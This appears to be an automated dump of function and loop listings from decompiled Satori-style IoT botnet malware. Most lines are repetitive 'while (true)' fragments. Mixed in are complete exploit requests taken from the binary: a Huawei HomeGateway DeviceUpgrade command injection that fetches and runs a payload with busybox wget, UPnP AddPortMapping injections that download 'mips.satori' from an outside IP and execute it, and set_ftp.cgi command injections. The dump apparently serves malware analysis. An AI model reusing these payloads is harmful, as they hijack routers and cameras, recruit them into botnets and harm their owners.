+                        function_b410(v197, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+                    case 4: {
+                    case 5: {
+                    case 6: {
+                                function_b410(v204, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v172);
+                    case 7: {
+                        function_b410(v207, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                    case 8: {
+                    case 9: {
+                        while (true) {
+                                while (true) {
+                        while (true) {
+                    case 10: {
+                    case 11: {
+                        function_b410(v233, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v172);
+                    case 12: {
+                        function_ab78(v234, (int32_t)"GET /set_ftp.cgi?loginuse=");
+                        function_ab2c((char *)&v104, (int32_t)"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28");
+                            while (true) {
+                                    function_ab2c((char *)&v104, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                                function_ab2c((char *)&v104, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                    case 13: {
+                    case 14: {
+                        function_ab78(v250, (int32_t)"GET /ftptest.cgi?loginuse=");
+                        function_ab2c((char *)&v104, (int32_t)" HTTP/1.0\r\n\r\n");
+                    case 15: {
+                while (true) {
+                                while (true) {
+                    while (true) {
+                    while (true) {
+=================FUNCTION : function_daa0 ===================
+++++++++ FUNCTION START 21714
+++++++++ FUNCTION END 24088
+++++++++ FUNCTION LENGTH 2374
+                            while (true) {
+                        while (true) {
+                        while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                        while (true) {
+                            while (true) {
+                                    while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                                        while (true) {
+                    case -1: {
+                            while (true) {
+                    case -2: {
+                            while (true) {
+                            while (true) {
+                                        while (true) {
+                while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                                while (true) {
+                                while (true) {
+                                        while (true) {
+                        case -1: {
+                                while (true) {
+                        case -2: {
+                                while (true) {
+                                while (true) {
+                                        while (true) {
+                    while (true) {
+                            while (true) {
+=================FUNCTION : function_8704 ===================
+++++++++ FUNCTION START 1824
+++++++++ FUNCTION END 2439
+++++++++ FUNCTION LENGTH 615
+        while (true) {
+                while (true) {
+                        while (true) {
+                            while (true) {
+                                            while (true) {
+                                    while (true) {
+                                    while (true) {
+                                                        while (true) {
+                while (true) {
+=================FUNCTION : function_8de4 ===================
+++++++++ FUNCTION START 2722
+++++++++ FUNCTION END 3136
+++++++++ FUNCTION LENGTH 414
+    while (true) {
+        while (true) {
+            while (true) {
+        while (true) {
+    while (true) {
+                    while (true) {
+                while (true) {
+            while (true) {
+=================FUNCTION : function_94a0 ===================
+++++++++ FUNCTION START 3479
+++++++++ FUNCTION END 3895
+++++++++ FUNCTION LENGTH 416
+        while (true) {
+                while (true) {
+                while (true) {
+                        if (function_bf38(v145, (struct sockaddr *)&v108, 16) != -1) {
+                                                            while (true) {
+    while (true) {
+=================FUNCTION : function_b4cc ===================
+++++++++ FUNCTION START 10100
+++++++++ FUNCTION END 10563
+++++++++ FUNCTION LENGTH 463
+    while (true) {
+                                while (true) {
+                                    while (true) {
+                while (true) {
+=================FUNCTION : function_b5dc ===================
+++++++++ FUNCTION START 10566
+++++++++ FUNCTION END 11061
+++++++++ FUNCTION LENGTH 495
+            while (true) {
+                        while (true) {
+                                while (true) {
+                    while (true) {
+=================FUNCTION : function_b6a8 ===================
+++++++++ FUNCTION START 11064
+++++++++ FUNCTION END 11624
+++++++++ FUNCTION LENGTH 560
+            while (true) {
+                        while (true) {
+                                while (true) {
+                    while (true) {
+=================FUNCTION : function_8c80 ===================
+++++++++ FUNCTION START 2553
+++++++++ FUNCTION END 2719
+++++++++ FUNCTION LENGTH 166
+    while (true) {
+            if (function_bf0c(v100, (struct sockaddr *)&v103, 16) == 0) {
+            function_bf38(v100, (struct sockaddr *)&v103, 16);
+            function_8c80(function_8704((int32_t)"nfig\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n"));
+=================FUNCTION : function_bee0 ===================
+++++++++ FUNCTION START 14995
+++++++++ FUNCTION END 15106
+++++++++ FUNCTION LENGTH 111
+    int32_t accepted_sock_fd = accept(sock, addr, (int32_t *)addr_len); // 0xbee4
+    if (accepted_sock_fd >= 0xfffff001) {
+        result = accepted_sock_fd;
+=================FUNCTION : function_abc4 ===================
+++++++++ FUNCTION START 7178
+++++++++ FUNCTION END 7410
+++++++++ FUNCTION LENGTH 232
+            while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_c0a8 ===================
+++++++++ FUNCTION START 16135
+++++++++ FUNCTION END 16246
+++++++++ FUNCTION LENGTH 111
+    int32_t sock_fd = socket(domain, type, protocol); // 0xc0ac
+    if (sock_fd >= 0xfffff001) {
+        result = sock_fd;
+=================FUNCTION : function_ac84 ===================
+++++++++ FUNCTION START 7413
+++++++++ FUNCTION END 7636
+++++++++ FUNCTION LENGTH 223
+            while (true) {
+            while (true) {
+        while (true) {
+=================FUNCTION : function_adb4 ===================
+++++++++ FUNCTION START 7777
+++++++++ FUNCTION END 8114
+++++++++ FUNCTION LENGTH 337
+    while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_81cc ===================
+++++++++ FUNCTION START 886
+++++++++ FUNCTION END 1062
+++++++++ FUNCTION LENGTH 176
+    while (true) {
+            while (true) {
+=================FUNCTION : function_82cc ===================
+++++++++ FUNCTION START 1065
+++++++++ FUNCTION END 1241
+++++++++ FUNCTION LENGTH 176
+    while (true) {
+            while (true) {
+=================FUNCTION : function_d63c ===================
+++++++++ FUNCTION START 21138
+++++++++ FUNCTION END 21280
+++++++++ FUNCTION LENGTH 142
+        v99 = sigprocmask(how, set, oset);
+    v99 = sigprocmask(how, set, oset);
+=================FUNCTION : function_af7c ===================
+++++++++ FUNCTION START 8471
+++++++++ FUNCTION END 8586
+++++++++ FUNCTION LENGTH 115
+        function_bf38(v100, (struct sockaddr *)&v101, 16);
+        function_bf64(v100, (struct sockaddr *)&v101, (int32_t)&v99);
+=================FUNCTION : function_b234 ===================
+++++++++ FUNCTION START 9474
+++++++++ FUNCTION END 9795
+++++++++ FUNCTION LENGTH 321
+        while (true) {
+                            while (true) {
+=================FUNCTION : function_be40 ===================
+++++++++ FUNCTION START 14765
+++++++++ FUNCTION END 14992
+++++++++ FUNCTION LENGTH 227
+        while (true) {
+        while (true) {
+=================FUNCTION : function_d328 ===================
+++++++++ FUNCTION START 20005
+++++++++ FUNCTION END 20178
+++++++++ FUNCTION LENGTH 173
+    int32_t v103 = getdents64(v102, (struct linux_dirent64 *)v101, v99); // 0xd358
+    while (true) {
+=================FUNCTION : function_a9e0 ===================
+++++++++ FUNCTION START 6392
+++++++++ FUNCTION END 6572
+++++++++ FUNCTION LENGTH 180
+        while (true) {
+    int32_t v115 = function_bee0(a1, (struct sockaddr *)&v114, (int32_t)&v101, v102); // 0xaadc
+=================FUNCTION : function_b448 ===================
+++++++++ FUNCTION START 9906
+++++++++ FUNCTION END 10097
+++++++++ FUNCTION LENGTH 191
+        while (true) {
+    while (true) {
+=================FUNCTION : function_83d0 ===================
+++++++++ FUNCTION START 1244
+++++++++ FUNCTION END 1368
+++++++++ FUNCTION LENGTH 124
+    while (true) {
+=================FUNCTION : function_b984 ===================
+++++++++ FUNCTION START 12764
+++++++++ FUNCTION END 12875
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = kill(pid, sig_num); // 0xb988
+=================FUNCTION : function_c04c ===================
+++++++++ FUNCTION START 15907
+++++++++ FUNCTION END 16018
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = send(sock, buf, length, flags); // 0xc050
+=================FUNCTION : function_b900 ===================
+++++++++ FUNCTION START 12422
+++++++++ FUNCTION END 12533
+++++++++ FUNCTION LENGTH 111
+    int32_t pid = getpid(); // 0xb904
+=================FUNCTION : function_b9b0 ===================
+++++++++ FUNCTION START 12878
+++++++++ FUNCTION END 12994
+++++++++ FUNCTION LENGTH 116
+    int32_t fd = open(path, oflag); // 0xb9d8
+=================FUNCTION : function_b92c ===================
+++++++++ FUNCTION START 12536
+++++++++ FUNCTION END 12647
+++++++++ FUNCTION LENGTH 111
+    int32_t ppid = getppid(); // 0xb930
+=================FUNCTION : function_ad54 ===================
+++++++++ FUNCTION START 7639
+++++++++ FUNCTION END 7774
+++++++++ FUNCTION LENGTH 135
+            while (true) {
+=================FUNCTION : function_bf38 ===================
+++++++++ FUNCTION START 15223
+++++++++ FUNCTION END 15334
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = connect(sock, addr, addr_len); // 0xbf3c
+=================FUNCTION : function_bf90 ===================
+++++++++ FUNCTION START 15451
+++++++++ FUNCTION END 15562
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = getsockopt(sock, level, option_name, option_value, NULL); // 0xbf98
+=================FUNCTION : function_bfec ===================
+++++++++ FUNCTION START 15679
+++++++++ FUNCTION END 15790
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = recv(sock, buf, length, flags); // 0xbff0
+=================FUNCTION : function_d218 ===================
+++++++++ FUNCTION START 19644
+++++++++ FUNCTION END 19755
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = clock_getres(clk_id, res); // 0xd21c
+=================FUNCTION : function_bf64 ===================
+++++++++ FUNCTION START 15337
+++++++++ FUNCTION END 15448
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = getsockname(sock, addr, (int32_t *)addr_len); // 0xbf68
+=================FUNCTION : function_aee8 ===================
+++++++++ FUNCTION START 8117
+++++++++ FUNCTION END 8246
+++++++++ FUNCTION LENGTH 129
+    while (true) {
+=================FUNCTION : function_ce8c ===================
+++++++++ FUNCTION START 18944
+++++++++ FUNCTION END 19277
+++++++++ FUNCTION LENGTH 333
+    while (true) {
+=================FUNCTION : function_b880 ===================
+++++++++ FUNCTION START 12083
+++++++++ FUNCTION END 12194
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = close(fd); // 0xb884
+=================FUNCTION : function_b114 ===================
+++++++++ FUNCTION START 9273
+++++++++ FUNCTION END 9471
+++++++++ FUNCTION LENGTH 198
+            while (true) {
+=================FUNCTION : function_c494 ===================
+++++++++ FUNCTION START 17202
+++++++++ FUNCTION END 17363
+++++++++ FUNCTION LENGTH 161
+    while (true) {
+=================FUNCTION : function_bf0c ===================
+++++++++ FUNCTION START 15109
+++++++++ FUNCTION END 15220
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = bind(sock, addr, addr_len); // 0xbf10
+=================FUNCTION : function_b8ac ===================
+++++++++ FUNCTION START 12197
+++++++++ FUNCTION END 12308
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = fork(); // 0xb8b0
+=================FUNCTION : function_c078 ===================
+++++++++ FUNCTION START 16021
+++++++++ FUNCTION END 16132
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = setsockopt(sock, level, option_name, option_value, 0); // 0xc080
+=================FUNCTION : function_bd04 ===================
+++++++++ FUNCTION START 14195
+++++++++ FUNCTION END 14344
+++++++++ FUNCTION LENGTH 149
+    while (true) {
+=================FUNCTION : function_c018 ===================
+++++++++ FUNCTION START 15793
+++++++++ FUNCTION END 15904
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = recvfrom(sock, buf, length, flags, NULL, NULL); // 0xc024
+=================FUNCTION : function_bfc0 ===================
+++++++++ FUNCTION START 15565
+++++++++ FUNCTION END 15676
+++++++++ FUNCTION LENGTH 111
+    int32_t v99 = listen(sock, backlog); // 0xbfc4
+=================FUNCTION : function_c650 ===================
+++++++++ FUNCTION START 17778
+++++++++ FUNCTION END 17949
+++++++++ FUNCTION LENGTH 171
+    while (true) {
+=================FUNCTION : function_9934 ===================
+++++++++ FUNCTION START 4009
+++++++++ FUNCTION END 4139
+++++++++ FUNCTION LENGTH 130
+    while (true) {
+=================FUNCTION : function_c55c ===================
+++++++++ FUNCTION START 17594
+++++++++ FUNCTION END 17775
+++++++++ FUNCTION LENGTH 181
+        while (true) {
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 1 @ function_81cc ====================================
+++++++++ WHILE START : 991 
+++++++++ WHILE FUNCTION : function_81cc 
+++++++++ WHILE END : 1057 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 2 @ function_82cc ====================================
+++++++++ WHILE START : 1170 
+++++++++ WHILE FUNCTION : function_82cc 
+++++++++ WHILE END : 1236 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 4 @ function_8704 ====================================
+++++++++ WHILE START : 1968 
+++++++++ WHILE FUNCTION : function_8704 
+++++++++ WHILE END : 2380 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 6 @ function_8c80 ====================================
+++++++++ WHILE START : 2653 
+++++++++ WHILE FUNCTION : function_8c80 
+++++++++ WHILE END : 2714 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (function_bf0c(v100, (struct sockaddr *)&v103, 16) == 0) {
+		function_bf38(v100, (struct sockaddr *)&v103, 16);
+		function_8c80(function_8704((int32_t)"nfig\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n"));
+=============================WHILE LOOPS ID : 7 @ function_8de4 ====================================
+++++++++ WHILE START : 2876 
+++++++++ WHILE FUNCTION : function_8de4 
+++++++++ WHILE END : 2928 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 14 @ function_94a0 ====================================
+++++++++ WHILE START : 3604 
+++++++++ WHILE FUNCTION : function_94a0 
+++++++++ WHILE END : 3868 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		if (function_bf38(v145, (struct sockaddr *)&v108, 16) != -1) {
+		while (true) {
+=============================WHILE LOOPS ID : 19 @ function_9ba0 ====================================
+++++++++ WHILE START : 5413 
+++++++++ WHILE FUNCTION : function_9ba0 
+++++++++ WHILE END : 5449 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 21 @ function_9ba0 ====================================
+++++++++ WHILE START : 5538 
+++++++++ WHILE FUNCTION : function_9ba0 
+++++++++ WHILE END : 5600 
+++++++++ INTRESTING INSTRUCTIONS :  
+		function_ab2c((char *)&v104, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+		function_ab2c((char *)&v104, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+=============================WHILE LOOPS ID : 22 @ function_9ba0 ====================================
+++++++++ WHILE START : 5758 
+++++++++ WHILE FUNCTION : function_9ba0 
+++++++++ WHILE END : 5791 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 38 @ function_b234 ====================================
+++++++++ WHILE START : 9586 
+++++++++ WHILE FUNCTION : function_b234 
+++++++++ WHILE END : 9782 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 41 @ function_b4cc ====================================
+++++++++ WHILE START : 10350 
+++++++++ WHILE FUNCTION : function_b4cc 
+++++++++ WHILE END : 10562 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 42 @ function_b5dc ====================================
+++++++++ WHILE START : 10699 
+++++++++ WHILE FUNCTION : function_b5dc 
+++++++++ WHILE END : 11049 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 43 @ function_b6a8 ====================================
+++++++++ WHILE START : 11228 
+++++++++ WHILE FUNCTION : function_b6a8 
+++++++++ WHILE END : 11604 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 60 @ function_daa0 ====================================
+++++++++ WHILE START : 23143 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23275 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 63 @ function_daa0 ====================================
+++++++++ WHILE START : 23393 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23456 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 66 @ function_daa0 ====================================
+++++++++ WHILE START : 23501 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23564 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 67 @ function_daa0 ====================================
+++++++++ WHILE START : 23573 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23636 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 71 @ function_daa0 ====================================
+++++++++ WHILE START : 23813 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23848 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 74 @ function_daa0 ====================================
+++++++++ WHILE START : 23920 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 23955 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 75 @ function_daa0 ====================================
+++++++++ WHILE START : 23990 
+++++++++ WHILE FUNCTION : function_daa0 
+++++++++ WHILE END : 24053 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
